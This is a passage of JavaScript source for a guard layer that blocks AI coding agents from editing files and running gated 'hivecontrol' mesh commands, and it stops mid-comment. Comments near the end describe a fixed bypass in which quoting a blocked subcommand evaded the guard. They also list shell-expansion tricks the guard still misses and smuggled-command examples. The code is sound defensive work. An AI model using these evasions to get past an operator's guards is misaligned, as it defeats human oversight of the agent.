// noWorkspaceRepo(cwd): the repository opts out of workspaces (a setting, or the rule in its CLAUDE.md / AGENTS.md)
function noWorkspaceRepo(cwd) {
  var dir0 = path.resolve(cwd || process.cwd());
  var raw = settings.get('jev', 'dispatchTierNoWorkspaceRepos');
  var list = String(raw || '').split(',').map(function (s) { return s.trim(); }).filter(Boolean);
  if (list.indexOf('*') >= 0) return true;
  for (var i = 0; i < list.length; i++) {
    var e = list[i];
    if (path.isAbsolute(e) ? (dir0 === e || dir0.indexOf(e + '/') === 0) : dir0.split('/').indexOf(e) >= 0) return true;
  }
  if (settings.get('jev', 'dispatchTierDetectNoWorkspaces') === false) return false;
  var re = cmdRe(ah.cfg('command.tier_doc_pattern'));
  var root = null;
  root = LIB['../companion/lib/identity.js'].resolveContext(dir0, { missingPath: 'ancestor' }).worktreeRoot || null;
  var dir = dir0, files = ah.cfg('command.tier_doc_files');
  for (var n = 0; n < ah.cfgNum('command.tier_doc_levels'); n++) {
    for (var k = 0; k < files.length; k++) {
      var f = path.join(dir, files[k]), txt = ah.fs.readText(f);
      if (txt === null) continue;
      if (txt.indexOf('�') >= 0) unsure(); // not valid UTF-8: Node decodes differently
      if (re.test(txt)) return true;
    }
    if (root && dir === root) break;
    var up = path.dirname(dir);
    if (up === dir) break;
    dir = up;
  }
  return false;
}
LIB['./lib/primary-tier.js'] = {
  primaryTierTextOn: function (env, cwd) {
    if (!LIB['./lib/devswarm-detect.js'].isDevswarmActive() || LIB['./lib/devswarm-role.js'].isChildWorkspace()) return false;
    if (!settings.enabled('devswarm', 'dispatchTierText')) return false;
    if (noWorkspaceRepo(cwd || process.cwd())) return false;
    return true;
  },
};

// hooks/lib/devswarm-inbox-paths.js `classifyDevswarmPath`: a raw store file needs the store module's presence check, which
// the engine does not make
LIB['./lib/devswarm-inbox-paths.js'] = {
  classifyDevswarmPath: function (raw, home, cwd) {
    if (!raw || typeof raw !== 'string') return 'allow';
    var h = home || os.homedir();
    var abs = raw;
    if (!path.isAbsolute(abs)) abs = path.resolve(cwd && typeof cwd === 'string' ? cwd : h, abs);
    var nAbs = String(abs).replace(/\\/g, '/').replace(RX8, '');
    var nRoot = path.join(h, ah.cfg('command.devswarm_root_rel')).replace(/\\/g, '/').replace(RX8, '');
    if (nAbs !== nRoot && nAbs.indexOf(nRoot + '/') !== 0) return 'allow';
    var rel = nAbs === nRoot ? '' : nAbs.slice(nRoot.length + 1);
    if (rel === '') return 'allow';
    var seg = rel.split('/')[0];
    if (seg === ah.cfg('command.devswarm_inbox_dir')) return 'deny-inbox';
    if (seg === ah.cfg('command.devswarm_store_dir')) {
      var rest = rel.slice(seg.length + 1);
      if (ah.cfg('command.store_deny_patterns').some(function (p) { return new RegExp(p).test(rest); })) unsure();
    }
    return 'allow';
  },
};

// ---------------------------------------------------------------------------------------------------------------------
// hooks/lib/command-allow.js (the trusted per-project allowlists)

LIB['./lib/command-allow.js'] = (function () {
  var KINDS = function (kind) {
    return kind === 'edit'
      ? { rel: ah.cfg('command.edit_file_rel'), trustFile: ah.cfg('command.edit_trust_file_rel'), listKey: ah.cfg('command.edit_list_key') }
      : { rel: ah.cfg('command.allow_file_rel'), trustFile: ah.cfg('command.allow_trust_file_rel'), listKey: ah.cfg('command.allow_list_key') };
  };
  function validatePattern(p) {
    if (typeof p !== 'string') return { ok: false };
    if (p.indexOf('^') !== 0) return { ok: false };
    if (!RX9.test(p) || RX10.test(p)) return { ok: false };
    if (!RX11.test(p)) return { ok: false };
    var scan = scanPattern(p);
    if (scan.topLevelAlternation || scan.unboundedWildcard) return { ok: false };
    try { new RegExp(p); } catch (e) { return { ok: false }; }
    return { ok: true };
  }
  function scanPattern(src) {
    var depth = 0, topLevelAlternation = false, unboundedWildcard = null, groupStarts = [];
    var isUnboundedQuant = function (i) {
      var q = src[i];
      if (q === '*' || q === '+') return true;
      if (q === '{') return RX12.test(src.slice(i));
      return false;
    };
    for (var i = 0; i < src.length; i++) {
      var c = src[i];
      if (c === '\\') { i++; continue; }
      if (c === '[') {
        var j = i + 1;
        if (src[j] === '^') j++;
        if (src[j] === ']') j++;
        while (j < src.length && src[j] !== ']') { if (src[j] === '\\') j++; j++; }
        var body = src.slice(i + 1, j);
        var spansSpace = body.indexOf('^') === 0 ? !RX13.test(body) : RX14.test(body);
        if (spansSpace && isUnboundedQuant(j + 1) && !unboundedWildcard) unboundedWildcard = src.slice(i, j + 2);
        i = j;
        continue;
      }
      if (c === '(') { depth++; groupStarts.push(i); continue; }
      if (c === ')') {
        depth = Math.max(0, depth - 1);
        var start = groupStarts.length ? groupStarts.pop() : 0;
        var b2 = src.slice(start + 1, i);
        if (isUnboundedQuant(i + 1) && RX15.test(b2) && !unboundedWildcard) unboundedWildcard = src.slice(start, i + 2);
        continue;
      }
      if (c === '|' && depth === 0) topLevelAlternation = true;
      if (c === '.' && isUnboundedQuant(i + 1) && !unboundedWildcard) unboundedWildcard = src.slice(i, i + 2);
    }
    return { topLevelAlternation: topLevelAlternation, unboundedWildcard: unboundedWildcard };
  }
  function repoToplevel(cwd) {
    try { return LIB['../companion/lib/identity.js'].resolveContext(cwd || process.cwd(), { missingPath: 'ancestor' }).toplevel || null; }
    catch (e) { if (cmdFatal(e)) throw e; return null; }
  }
  function repoKey(top) { try { return fs.realpathSync(top); } catch (e) { if (e && e.unsure) throw e; return path.resolve(top); } }
  function readAllowFile(top, kind) {
    var spec = KINDS(kind), cfgPath = path.join(top, spec.rel), dir = path.dirname(cfgPath), dst, fst;
    try { dst = fs.lstatSync(dir); } catch (e) { if (e.unsure) throw e; return { state: 'missing' }; }
    if (dst.isSymbolicLink()) return { state: 'symlink' };
    try { fst = fs.lstatSync(cfgPath); } catch (e) { if (e.unsure) throw e; return { state: 'missing' }; }
    if (fst.isSymbolicLink()) return { state: 'symlink' };
    if (!fst.isFile()) return { state: 'unreadable' };
    var hash = ah.fs.sha256File(cfgPath), txt = ah.fs.readText(cfgPath);
    if (hash === null || txt === null) return { state: 'unreadable' };
    if (txt.indexOf('�') >= 0) unsure(); // not valid UTF-8: Node decodes differently
    var parsed;
    try { parsed = JSON.parse(txt); } catch (e) { return { state: 'invalid-json' }; }
    var patterns = parsed && Array.isArray(parsed[spec.listKey]) ? parsed[spec.listKey] : [];
    return { state: 'ok', hash: hash, patterns: patterns };
  }
  function readTrustRecords(home, kind) {
    try {
      var t = ah.fs.readText(path.join(home, KINDS(kind).trustFile));
      if (t === null) return {};
      if (t.indexOf('�') >= 0) unsure();
      var obj = JSON.parse(t);
      return obj && typeof obj === 'object' && !Array.isArray(obj) ? obj : {};
    } catch (e) { if (cmdFatal(e)) throw e; return {}; }
  }
  function trustState(home, top, hash, kind) {
    var rec = readTrustRecords(home, kind)[repoKey(top)];
    if (typeof rec !== 'string' || !rec) return 'untrusted';
    return rec === hash ? 'trusted' : 'mismatch';
  }
  function loadTrustedPatterns(cwd, home) {
    var top = repoToplevel(cwd);
    if (!top || !home) return [];
    var f = readAllowFile(top);
    if (f.state !== 'ok') return [];
    if (trustState(home, top, f.hash) !== 'trusted') return [];
    return f.patterns.filter(function (p) { return validatePattern(p).ok; });
  }
  function validateEditPath(p) {
    if (typeof p !== 'string') return { ok: false };
    var t = p.trim();
    if (!t || t !== p) return { ok: false };
    if (t.charAt(0) === '/' || RX16.test(t)) return { ok: false };
    if (t.charAt(0) === '~') return { ok: false };
    if (t.indexOf('\\') >= 0) return { ok: false };
    if (t.split('/').some(function (seg) { return seg === '..'; })) return { ok: false };
    if (RX17.test(t)) return { ok: false };
    return { ok: true };
  }
  function loadTrustedEditPaths(cwd, home) {
    var top = repoToplevel(cwd);
    if (!top || !home) return { top: top, paths: [] };
    var f = readAllowFile(top, 'edit');
    if (f.state !== 'ok') return { top: top, paths: [] };
    if (trustState(home, top, f.hash, 'edit') !== 'trusted') return { top: top, paths: [] };
    return { top: top, paths: f.patterns.filter(function (p) { return validateEditPath(p).ok; }) };
  }
  return { loadTrustedEditPaths: loadTrustedEditPaths, loadTrustedPatterns: loadTrustedPatterns, repoToplevel: repoToplevel, repoKey: repoKey, validatePattern: validatePattern };
})();

// ---------------------------------------------------------------------------------------------------------------------
// hooks/edit-guard.js (the verdict on one path, the notes test and the delegation text)

LIB['./edit-guard.js'] = (function () {
  var sp = LIB['./lib/scratchpad.js'];
  var ownScratchpadDirs = sp.ownScratchpadDirs, realpathOrSelf = sp.realpathOrSelf;
  function basename(p) {
    if (!p) return '';
    var parts = String(p).replace(/\\/g, '/').split('/');
    return parts[parts.length - 1];
  }
  function toRelPath(filePath, cwd) {
    if (!filePath) return '';
    var p = String(filePath);
    if (cwd) {
      try { if (path.isAbsolute(p)) p = path.relative(cwd, p); } catch (e) { if (e.unsure) throw e; }
    }
    return p.replace(/\\/g, '/');
  }
  function escapeRegExpChar(c) { return RX18.test(c) ? '\\' + c : c; }
  function globToRegExp(glob) {
    var src = '', i = 0, n = glob.length;
    while (i < n) {
      var c = glob[i];
      if (c === '*' && glob[i + 1] === '*') { src += '.*'; i += 2; continue; }
      if (c === '*') { src += '[^/]*'; i += 1; continue; }
      src += escapeRegExpChar(c);
      i += 1;
    }
    return new RegExp('^' + src + '$');
  }
  function isAllowed(filePath, cwd) {
    if (!filePath) return false;
    var base = basename(filePath), rel = toRelPath(filePath, cwd);
    var def = ah.cfg('command.eg_default_allow');
    for (var d = 0; d < def.length; d++) {
      var re = globToRegExp(def[d]);
      if (def[d].indexOf('/') >= 0) { if (re.test(base) || re.test(rel)) return true; }
      else if (rel.indexOf('/') < 0 && re.test(rel)) return true;
    }
    var envAllow = String(settings.get('guards', 'editGuardAllow') || '').split(RX19).map(function (s) { return s.trim(); }).filter(Boolean);
    for (var i = 0; i < envAllow.length; i++) {
      var r2 = globToRegExp(envAllow[i]);
      if (r2.test(base) || r2.test(rel)) return true;
    }
    return false;
  }
  function samePath(a, b) {
    var norm = function (s) { return String(s).replace(/\\/g, '/').replace(RX8, ''); };
    return norm(a) === norm(b);
  }
  function allowlistIsHonest(filePath, cwd) {
    try {
      var base = cwd ? String(cwd) : process.cwd();
      var abs = path.resolve(base, String(filePath));
      var rel = path.relative(base, abs);
      var inside = rel && rel.indexOf('..') !== 0 && !path.isAbsolute(rel);
      var chain = [];
      if (inside) {
        var cur = base;
        rel.split('/').forEach(function (seg) { cur = path.join(cur, seg); chain.push(cur); });
      } else chain.push(abs);
      for (var i = 0; i < chain.length; i++) {
        var st;
        try { st = fs.lstatSync(chain[i]); } catch (e) {
          if (e && e.unsure) throw e;
          if (e && e.code === 'ENOENT') return true; // first write: nothing below exists
          return false; // unexpected fs error -> fail CLOSED
        }
        if (st.isSymbolicLink()) return false;
        if (i === chain.length - 1 && st.isFile() && st.nlink > 1) return false;
      }
      return samePath(path.dirname(fs.realpathSync(abs)), fs.realpathSync(path.dirname(abs)));
    } catch (e) { if (cmdFatal(e)) throw e; return false; }
  }
  // handover-find.js sessionProjectRoot: the outermost checkout unless that is the real home
  function sessionProjectRoot(cwd) {
    if (typeof cwd !== 'string' || !cwd) return cwd;
    try {
      var ctx = LIB['../companion/lib/identity.js'].resolveContext(cwd);
      var home = os.homedir(), realHome = home;
      try { realHome = fs.realpathSync(home); } catch (e) { if (e.unsure) throw e; }
      if (ctx && ctx.worktreeRoot && ctx.worktreeRoot !== realHome) return ctx.worktreeRoot;
    } catch (e) { if (cmdFatal(e)) throw e; }
    return cwd;
  }
  function canonicalUnderProjectRoot(filePath, cwd) {
    try {
      if (!filePath || !cwd) return null;
      var root = realpathOrSelf(sessionProjectRoot(cwd) || cwd);
      var abs = path.resolve(String(cwd), String(filePath));
      var real = path.join(realpathOrSelf(path.dirname(abs)), path.basename(abs));
      var rel = path.relative(root, real);
      if (!rel || rel.indexOf('..') === 0 || path.isAbsolute(rel)) return null;
      return { filePath: real, root: root };
    } catch (e) { if (cmdFatal(e)) throw e; return null; }
  }
  var SOURCE_DIRS = RX20;
  var SOURCE_EXT = RX21;
  function isLikelySource(filePath) {
    if (!filePath) return false;
    var norm = String(filePath).replace(/\\/g, '/');
    return SOURCE_DIRS.test(norm) || SOURCE_EXT.test(norm);
  }
  var HANDOVER_DOC_RE = RX22;
  function isHandoverDoc(filePath) {
    if (!filePath) return false;
    var base = basename(filePath);
    return RX23.test(base) && HANDOVER_DOC_RE.test(base);
  }
  function isLegacyContinueHere(filePath, cwd) {
    if (!filePath) return false;
    var rel = posix.normalize(toRelPath(filePath, cwd));
    return rel.indexOf('/') < 0 && RX24.test(rel);
  }
  function isOwnScratchpadPath(filePath, payload) {
    if (!filePath) return false;
    var dirs = ownScratchpadDirs(payload);
    if (!dirs.length) return false;
    try {
      var base = (payload && payload.cwd) || process.cwd();
      var realAbs = realpathOrSelf(path.resolve(String(base), String(filePath)));
      for (var i = 0; i < dirs.length; i++) {
        var rel = path.relative(realpathOrSelf(dirs[i]), realAbs);
        if (rel && rel.indexOf('..') !== 0 && !path.isAbsolute(rel)) return true;
      }
      return false;
    } catch (e) { if (cmdFatal(e)) throw e; return false; }
  }
  function isWithinCwd(filePath, cwd) {
    try {
      var base = cwd ? String(cwd) : process.cwd();
      var rel = path.relative(base, path.resolve(base, String(filePath)));
      return !!rel && rel.indexOf('..') !== 0 && !path.isAbsolute(rel);
    } catch (e) { if (cmdFatal(e)) throw e; return false; }
  }
  function isHarnessPlanFile(filePath, cwd) {
    if (!filePath) return false;
    try {
      if (!RX23.test(String(filePath))) return false;
      var base = cwd ? String(cwd) : process.cwd();
      var abs = path.resolve(base, String(filePath));
      var plansDir = path.join(os.homedir(), ah.cfg('command.eg_plans_rel'));
      var rel = path.relative(realpathOrSelf(plansDir), realpathOrSelf(abs));
      return !!rel && rel.indexOf('..') !== 0 && !path.isAbsolute(rel);
    } catch (e) { if (cmdFatal(e)) throw e; return false; }
  }
  function projectEditAllowOn() { return settings.get('guards', 'projectEditAllow') !== false; }
  function projectEditTarget(filePath, cwd) {
    if (!filePath) return null;
    var base = cwd ? String(cwd) : process.cwd();
    var top = LIB['./lib/command-allow.js'].repoToplevel(base);
    if (!top) return null;
    var realTop = realpathOrSelf(top), realAbs = realpathOrSelf(path.resolve(base, String(filePath)));
    var rel = path.relative(realTop, realAbs);
    if (!rel || rel.indexOf('..') === 0 || path.isAbsolute(rel)) return null;
    return { top: top, rel: rel.split('/').join('/'), realAbs: realAbs };
  }
  function foldSegment(seg) {
    var t = String(seg);
    try { t = t.normalize('NFKC'); } catch (e) { /* keep raw */ }
    return t.toLowerCase();
  }
  function isEditAllowFileTarget(filePath, cwd) {
    try {
      var t = projectEditTarget(filePath, cwd);
      return !!t && t.rel.split('/').map(foldSegment).join('/') === ah.cfg('command.eg_edit_allow_file');
    } catch (e) { if (cmdFatal(e)) throw e; return false; }
  }
  function isProjectEditAllowed(filePath, cwd) {
    try {
      var t = projectEditTarget(filePath, cwd);
      if (!t) return false;
      var segs = t.rel.split('/').map(foldSegment), deny = ah.cfg('command.eg_project_deny_segments');
      if (segs.some(function (seg) { return deny.indexOf(seg) >= 0; })) return false;
      if (segs[segs.length - 1] === ah.cfg('command.eg_hooks_file')) return false;
      var sh = spawn.stateHome();
      if (sh.unknown) unsure();
      if (sh.guarded) return false; // resolveHome throws under a test run on the real home: fail closed
      var home = sh.ok;
      var claudeHome = realpathOrSelf(path.join(home, ah.cfg('command.eg_claude_dir')));
      var inClaudeHome = path.relative(claudeHome, t.realAbs);
      if (inClaudeHome === '' || (inClaudeHome.indexOf('..') !== 0 && !path.isAbsolute(inClaudeHome))) return false;
      var paths = LIB['./lib/command-allow.js'].loadTrustedEditPaths(cwd || process.cwd(), home).paths;
      if (!paths.length) return false;
      if (!paths.some(function (glob) { return globToRegExp(glob).test(t.rel); })) return false;
      return allowlistIsHonest(filePath, cwd);
    } catch (e) { if (cmdFatal(e)) throw e; return false; }
  }
  function isPlanMode(payload) {
    var m = payload && payload.permission_mode;
    return typeof m === 'string' && m.toLowerCase() === ah.cfg('command.eg_plan_mode');
  }
  function editVerdict(filePath, cwd, payload) {
    var projectEditAllow = projectEditAllowOn();
    if (projectEditAllow && isEditAllowFileTarget(filePath, cwd)) return 'block-self-edit';
    if (isAllowed(filePath, cwd) && allowlistIsHonest(filePath, cwd)) return 'allow';
    var canon = canonicalUnderProjectRoot(filePath, cwd);
    if (canon && isAllowed(canon.filePath, canon.root) && allowlistIsHonest(canon.filePath, canon.root)) return 'allow';
    if (projectEditAllow && isProjectEditAllowed(filePath, cwd)) return 'allow';
    if (isHarnessPlanFile(filePath, cwd) && allowlistIsHonest(filePath, cwd)) return 'allow';
    if (isOwnScratchpadPath(filePath, payload) && allowlistIsHonest(filePath, cwd)) return 'allow';
    if ((isHandoverDoc(filePath) || isLegacyContinueHere(filePath, cwd)) && isWithinCwd(filePath, cwd) && allowlistIsHonest(filePath, cwd)) {
      if (!cwd) return 'allow';
      var alreadyExists = false;
      try { alreadyExists = fs.existsSync(path.resolve(String(cwd), String(filePath))); } catch (e) { if (e.unsure) throw e; alreadyExists = true; }
      return alreadyExists ? 'allow' : 'block-handover';
    }
    if (isPlanMode(payload) && !isLikelySource(filePath) && allowlistIsHonest(filePath, cwd)) return 'allow';
    return 'block';
  }
  function isNotesTarget(filePath, cwd, payload) {
    if (isAllowed(filePath, cwd) && allowlistIsHonest(filePath, cwd)) return true;
    var canon = canonicalUnderProjectRoot(filePath, cwd);
    if (canon && isAllowed(canon.filePath, canon.root) && allowlistIsHonest(canon.filePath, canon.root)) return true;
    if (isOwnScratchpadPath(filePath, payload) && allowlistIsHonest(filePath, cwd)) return true;
    if (isHarnessPlanFile(filePath, cwd) && allowlistIsHonest(filePath, cwd)) return true;
    return false;
  }
  function delegationReason(toolLabel, cwd, payload) {
    var HT = LIB['./lib/host-text.js'];
    var codexHost = HT.isCodex(payload);
    var SUB = codexHost ? HT.CODEX_SUBAGENT : ah.cfg('command.claude_subagent');
    var devswarmActive = LIB['./lib/devswarm-detect.js'].isDevswarmActive();
    var override = text.render(ah.cfg('command.msg_edit_override'), { skip: LIB['./lib/skip-cmd.js'].skipCommand('edit-guard') });
    var NOTES = codexHost ? text.render(ah.cfg('command.msg_edit_notes_codex'), { sub: SUB }) : ah.cfg('command.msg_edit_notes');
    var what = text.render(ah.cfg('command.msg_edit_what'), { who: devswarmActive ? ah.cfg('command.msg_edit_who_orch') : ah.cfg('command.msg_edit_who_coord') });
    var guard = ah.cfg('command.edit_guard_name');
    if (devswarmActive) {
      var childWorkspace = LIB['./lib/devswarm-role.js'].isChildWorkspace();
      var tierText = !childWorkspace && LIB['./lib/primary-tier.js'].primaryTierTextOn(null, cwd);
      return text.message('block', guard, {
        what: what, why: ah.cfg('command.msg_edit_why_orch'),
        instead: text.render(ah.cfg(tierText ? 'command.msg_edit_instead_tier' : 'command.msg_edit_instead'), { sub: SUB }),
        allowed: NOTES, override: override,
      });
    }
    return text.message('block', guard, { what: what, why: ah.cfg('command.msg_edit_why'), instead: text.render(ah.cfg('command.msg_edit_instead'), { sub: SUB }), override: override });
  }
  return { isNotesTarget: isNotesTarget, editVerdict: editVerdict, delegationReason: delegationReason };
})();

// ---------------------------------------------------------------------------------------------------------------------
// hooks/lib/shell-scan.js (the heredoc parser and the shell-interpreter verbs are the shared shellScan of lib/51-shell-scan.js)

var basename = shellScan.basename;
var parseHeredocAt = shellScan.parseHeredocAt;
function tokenizeQuoted(segment) {
  return cmdMemo('tok:' + segment, function () { return tokenizeQuotedRaw(segment); });
}
function tokenizeQuotedRaw(segment) {
  const tokens = [];
  let cur = ''; let q = ''; let any = false;
  const str = segment.trim();
  for (let i = 0; i < str.length; i++) {
    const c = str[i];
    if (q) { if (c === q) { q = ''; } else cur += c; any = true; continue; }
    if (c === "'" || c === '"') { q = c; any = true; continue; }
    if (cmdWs(c)) { if (any) { tokens.push(cur); cur = ''; any = false; } continue; }
    cur += c; any = true;
  }
  if (any) tokens.push(cur);
  return tokens;
}

function dequoteSegment(segment) {
  return tokenizeQuoted(segment).join(' ');
}

function extractSubstitutions(s) {
  return cmdMemo('sub:' + s, function () { return extractSubstitutionsRaw(s); });
}
function extractSubstitutionsRaw(s) {
  const found = [];
  let i = 0;
  const n = s.length;
  let inSingle = false;
  let inDouble = false;
  while (i < n) {
    const c = s[i];
    const c2 = i + 1 < n ? s[i + 1] : '';
    if (!inSingle && !inDouble && c === '<' && c2 === '<') {
      const parsed = parseHeredocAt(s, i);
      if (parsed) {
        if (parsed.quoted) {
          i = parsed.end;
        } else {
          i = i + parsed.openerText.length;
          if (i < n && s[i] === '\n') i++;
        }
        continue;
      }
    }
    if (inSingle) { if (c === "'") inSingle = false; i++; continue; }
    if (!inDouble && c === '$' && c2 === "'") {
      i += 2;
      while (i < n && s[i] !== "'") i += s[i] === '\\' ? 2 : 1;
      i++; continue;
    }
    if (!inDouble && c === "'") { inSingle = true; i++; continue; }
    if (c === '"') { inDouble = !inDouble; i++; continue; }
    if (c === '$' && c2 === '(') {
      let depth = 1; let j = i + 2; let inner = '';
      while (j < n && depth > 0) {
        const cj = s[j];
        if (cj === '(') depth++;
        else if (cj === ')') { depth--; if (depth === 0) break; }
        inner += cj; j++;
      }
      if (inner.trim()) found.push(inner);
      i = j + 1; continue;
    }
    if (c === '`') {
      let j = i + 1; let inner = '';
      while (j < n && s[j] !== '`') { inner += s[j]; j++; }
      if (inner.trim()) found.push(inner);
      i = j + 1; continue;
    }
    i++;
  }
  return found;
}

function heredocBodiesIn(text) {
  const out = [];
  let q = '';
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (q) {
      if (c === '\\' && q === '"') { i++; continue; }
      if (c === q) q = '';
      continue;
    }
    if (c === '\\') { i++; continue; }
    if (c === "'" || c === '"') { q = c; continue; }
    if (c === '<' && text[i + 1] === '<') {
      const h = parseHeredocAt(text, i);
      if (h) {
        out.push(h.body);
        i = Math.max(i, (h.lineEnd !== undefined ? h.end : h.openerEnd) - 1);
      } else if (text[i + 2] === '<') {
        i += 2;
      }
    }
  }
  return out;
}

function segmentHeredocBodies(segments, text) {
  const all = heredocBodiesIn(String(text || ''));
  const per = [];
  let k = 0;
  for (const s of segments) {
    const n = heredocBodiesIn(String(s || '')).length;
    per.push(all.slice(k, k + n));
    k += n;
  }
  return per;
}

// ---------------------------------------------------------------------------------------------------------------------
// hooks/command-guard.js

// anchoredAntiHallStableLauncher(scriptFile) -> RegExp for one of the two
// version-independent ~/.anti-hall/bin/ stable launchers (hooks/lib/
// stable-launcher.js: devswarm.js, wake-watch.js). ROOT CAUSE (peer report,
// downstream-project Primary, 2026-09-26): anchoredAntiHallCli('scripts', 'devswarm',
// '\\b') above only exempts the PLUGIN-RELATIVE `.../scripts/devswarm.js`
// form. Since the devswarm.stableLauncher setting defaulted on (v0.109+),
// every hook-emitted directive (mailbox wake cron, Monitor re-arm command,
// DevSwarm comms override, Stop-gate drain/handover text) instead names the
// STABLE LAUNCHER path under ~/.anti-hall/bin/ — a form the old regex never
// recognized, so it fell through to the generic `node <file>.js`
// HEAVY_PATTERN and every Primary's cron tick / inline mesh command using
// the launcher was wrongly blocked.
//
// Now shared with git-guard.js via hooks/lib/stable-launcher.js (was a
// byte-for-byte duplicate in each file — see that module's own doc comment
// for the full anchoring rationale: which home-anchor forms are accepted,
// and why the anchoring stays as narrow as anchoredAntiHallCli above).
// hivectlSegmentHasHelpFlag(seg) -> true iff this SEGMENT's argv (tokenized the
// same quote-aware way as every other token scan in this file — tokenizeQuoted,
// shared with git-guard.js via ./lib/shell-scan.js) contains a bare `--help` or
// `-h` token. A read-only `--help`/`-h` invocation of a gated hivecontrol/devswarm
// subcommand (`hivecontrol workspace read-messages --help`, `... monitor -h`,
// `... message-child --help`) never touches the mailbox/mesh — it just prints
// usage and exits — so it is not the destructive-read / native-send action this
// guard exists to stop. Checked PER SEGMENT (splitSegments already isolates
// shell-chained commands: `;`, `&&`, `||`, `|`, newlines), so a smuggled
// `hivecontrol workspace message-child --help ; hivecontrol workspace
// message-child x` still blocks on its SECOND segment, which carries no
// --help/-h token of its own. Token-exact match only (`--help`/`-h` as their
// own argv word) — a token that merely CONTAINS "help" as a substring
// (`--help-me`, a file literally named `-h`) does not count, mirroring how a
// real arg parser distinguishes a flag from an arbitrary operand.
function hivectlSegmentHasHelpFlag(seg) {
  const tokens = tokenizeQuoted(seg);
  return tokens.some((t) => t === '--help' || t === '-h');
}

// detectHivectlDestructiveRead(command, depth) -> 'monitor' | 'read-messages' | null.
// Mirrors isHeavyCommand's matching discipline so DATA and CODE are separated the
// same way the heavy path does it: the per-segment regex test runs against the
// DEQUOTED segment — dequoteSegment(seg), the SHELL-EFFECTIVE argv text — so a
// quoted subcommand or verb (`hivecontrol workspace "monitor"`, `"hivecontrol"
// workspace monitor`, a mid-token split `mes"sage-par"ent`) matches IDENTICALLY
// to its unquoted form, because that is what the shell actually executes: quoting
// a bareword does not change argv. (FIXED P0: this previously ran against
// neutralizeQuotedContents(seg), which BLANKS quoted content instead of
// dequoting it — that made every quoted variant of a blocked subcommand
// invisible to the regex, a live-verified bypass of the single-consumer
// invariant.) Quoted DATA passed to an unrelated verb still safely ALLOWS:
// `grep 'hivecontrol workspace read-messages' f` / `echo "...monitor..."`
// dequote to `grep hivecontrol workspace read-messages f` / `echo ...monitor...`,
// but COMMAND-POSITION ANCHORING below reads the FIRST token as `grep`/`echo`,
// not `hivecontrol`, so they still do NOT match. `bash -c "..."`, `eval ...`,
// `$(...)` and backtick payloads ARE unwrapped and recursed (so a smuggled
// `bash -c "hivecontrol workspace read-messages"` / `$(hivecontrol workspace
// monitor)` STILL matches). `monitor` wins over `read-messages` when both
// appear, because monitor blocks unconditionally.
function detectHivectlDestructiveRead(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const d = typeof depth === 'number' ? depth : 0;
  let sawReadMessages = false;
  for (const seg of splitSegments(command)) {
    const dequoted = dequoteSegment(seg);
    // COMMAND-POSITION ANCHORING: only treat `hivecontrol` as the destructive verb
    // when it is actually THIS segment's command verb (mirrors the heavy path's
    // effectiveVerb discipline — basename + wrapper/assignment skipping), not merely
    // a word that happens to appear somewhere in the args. This drops the
    // false-positive where unquoted data args are literally these words in order —
    // `grep hivecontrol workspace monitor docs/KB.md`, `echo hivecontrol workspace
    // monitor` — which have verb `grep`/`echo`, not `hivecontrol`, so they ALLOW.
    // Smuggling is UNAFFECTED: `bash -c "..."`, `$(...)`, backtick, `eval`, and
    // chained (`a && hivecontrol ...`) forms each put hivecontrol at verb position
    // inside a recursively-extracted payload / its own segment, and a path- or
    // flag-prefixed form (`/usr/bin/hivecontrol workspace monitor`,
    // `sudo hivecontrol ...`) still resolves to `hivecontrol` via effectiveVerb —
    // now checked against the DEQUOTED segment (effectiveVerb(dequoted)) so a
    // quoted verb (`"hivecontrol" workspace monitor`) anchors correctly too.
    //
    // ACCEPTED LIMITATION (drift-guard threat model, NOT an adversary defense):
    // dequoting only recovers quote-delimited obfuscation. Forms that only
    // synthesize the verb/subcommand via shell PARAMETER or COMMAND expansion are
    // still NOT caught — `mon${X:-itor}`, `mon$(printf itor)`. Catching those
    // would need a full shell-expansion simulation, which is out of scope: this
    // guard prevents ACCIDENTAL and quote-obfuscated destructive reads, not a
    // determined shell-expansion bypass. Tests document these as knowingly-allowed.
    if (T.devswarmVerbs.has(effectiveVerb(dequoted)) && !hivectlSegmentHasHelpFlag(seg)) {
      if (T.hcMonitor.test(dequoted)) return 'monitor';
      if (T.hcReadMessages.test(dequoted)) sawReadMessages = true;
    }
    if (d < T.maxDepth) {
      const payload = extractShellCPayload(seg);
      if (payload) {
        const inner = detectHivectlDestructiveRead(payload, d + 1);
        if (inner === 'monitor') return 'monitor';
        if (inner === 'read-messages') sawReadMessages = true;
      }
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload) {
        const inner = detectHivectlDestructiveRead(evalPayload, d + 1);
        if (inner === 'monitor') return 'monitor';
        if (inner === 'read-messages') sawReadMessages = true;
      }
    }
  }
  if (d < T.maxDepth) {
    for (const inner of extractSubstitutions(command)) {
      const r = detectHivectlDestructiveRead(inner, d + 1);
      if (r === 'monitor') return 'monitor';
      if (r === 'read-messages') sawReadMessages = true;
    }
  }
  return sawReadMessages ? 'read-messages' : null;
}

// detectHivectlMessageSend(command, depth) -> 'message-child' | 'message-parent' | null.
// Mirrors detectHivectlDestructiveRead's matching discipline byte-for-byte: the
// per-segment regex test runs against the DEQUOTED segment — dequoteSegment(seg),
// the SHELL-EFFECTIVE argv text — so a quoted subcommand or verb
// (`hivecontrol workspace "message-parent"`, `"hivecontrol" workspace
// message-parent`, a mid-token split `mes"sage-par"ent`) matches IDENTICALLY to
// its unquoted form, because quoting a bareword does not change argv. (FIXED
// P0: this previously ran against neutralizeQuotedContents(seg), which BLANKS
// quoted content instead of dequoting it — a live-verified bypass of v0.58's
// mesh-only-messaging invariant, since the guard's own block reason echoes the
// blocked subcommand back, making "just quote it" the natural retry.) Quoted
// DATA passed to an unrelated verb still safely ALLOWS: `grep 'hivecontrol
// workspace message-parent' docs/KB.md` / `echo "...message-child..."` dequote
// to `grep hivecontrol workspace message-parent docs/KB.md` / `echo
// ...message-child...`, but COMMAND-POSITION ANCHORING below reads the FIRST
// token as `grep`/`echo`, not `hivecontrol`, so they still do NOT match.
// `bash -c "..."`, `eval ...`, `$(...)` and backtick payloads ARE unwrapped and
// recursed (a smuggled `bash -c "hivecontrol workspace message-parent ..."` /
// `$(hivecontrol workspace message-child ...)` STILL matches).
// COMMAND-POSITION ANCHORING via effectiveVerb(dequoted) === 'hivecontrol' (the
// same false-positive protection as the destructive-read detector, now also
// dequoted so a quoted verb anchors correctly). message-child is checked first
// (arbitrary tie-break; both matching one command is not a realistic shape) —
